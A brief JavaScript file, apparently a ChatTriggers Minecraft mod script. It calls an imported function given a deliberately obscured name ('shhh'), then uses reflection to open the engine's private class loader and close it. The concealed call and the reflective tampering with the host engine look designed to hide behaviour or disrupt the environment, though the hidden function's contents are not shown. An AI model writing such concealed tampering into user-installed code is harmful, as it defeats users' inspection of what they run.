import { ___________________________________shhh } from './index';
___________________________________shhh();

const JSContextFactory = com.chattriggers.ctjs.engine.langs.js.JSContextFactory;
const classLoaderF = JSContextFactory.class.getDeclaredField('classLoader');
classLoaderF.setAccessible(true);
classLoaderF.get(JSContextFactory.INSTANCE).close();